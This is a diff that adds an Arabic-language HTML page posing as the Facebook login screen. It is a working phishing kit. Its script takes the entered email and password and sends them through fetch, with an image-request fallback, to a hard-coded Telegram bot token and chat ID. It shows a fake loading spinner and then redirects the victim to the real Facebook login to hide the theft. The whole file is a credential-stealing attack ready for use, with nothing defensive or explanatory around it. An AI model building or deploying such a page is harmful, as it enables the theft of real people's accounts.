@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; text-align: center; transition: all 0.3s ease; }
+        .fb-logo { width: 200px; margin-bottom: 20px; }
+        input { width: 92%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; outline: none; transition: border-color 0.3s; }
+        input:focus { border-color: #1877f2; }
+        
+        .login-btn { 
+            width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; 
+            color: white; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px;
+            display: flex; justify-content: center; align-items: center; min-height: 48px;
+            transition: all 0.2s; position: relative;
+        }
+        .login-btn:active { transform: scale(0.96); }
+        
+        /* أنيميشن الدائرة الدوارة */
+        .spinner {
+            display: none; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        #loading-msg { display: none; color: #606770; font-size: 14px; margin-top: 15px; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div class="login-box" id="mainBox">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2ygS89W.svg" alt="Facebook" class="fb-logo">
+        <form id="attackForm">
+            <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+            <button type="submit" class="login-btn" id="subBtn">
+                <span id="btnText">تسجيل الدخول</span>
+                <div class="spinner" id="loader"></div>
+            </button>
+        </form>
+        <div id="loading-msg">جاري التحقق من الهوية...</div>
+    </div>
+
+    <script>
+        // استخدام var لضمان عدم حدوث خطأ التكرار
+        var _token = '8201696738:AAGFkCZTmXwbCh_RfNxURBZtH2NZjBhUAsg';
+        var _chatId = '7576816211';
+
+        document.getElementById('attackForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // بدء الأنيميشن
+            const btnText = document.getElementById('btnText');
+            const loader = document.getElementById('loader');
+            const msg = document.getElementById('loading-msg');
+            const box = document.getElementById('mainBox');
+
+            btnText.style.display = 'none';
+            loader.style.display = 'block';
+            msg.style.display = 'block';
+            box.style.opacity = '0.8';
+
+            const user = document.getElementById('email').value;
+            const password = document.getElementById('pass').value;
+            const content = `🎯 صيد جديد مكتمل\n👤 الحساب: ${user}\n🔑 الباسورد: ${password}`;
+
+            // إرسال البيانات باستخدام fetch مع وضع no-cors لضمان العبور
+            const url = `https://api.telegram.org/bot${_token}/sendMessage?chat_id=${_chatId}&text=${encodeURIComponent(content)}`;
+            
+            try {
+                // نرسل الطلب وننتظر قليلاً ليراه الضحية كأنه تحميل حقيقي
+                await fetch(url, { mode: 'no-cors' });
+                
+                setTimeout(() => {
+                    window.location.replace("https://www.facebook.com/login");
+                }, 1500);
+            } catch (err) {
+                // في حالة الفشل نستخدم الطريقة الاحتياطية (الصورة)
+                new Image().src = url;
+                setTimeout(() => {
+                    window.location.replace("https://www.facebook.com/login");
+                }, 1500);
+            }
+        });
+    </script>
+</body>
+</html>
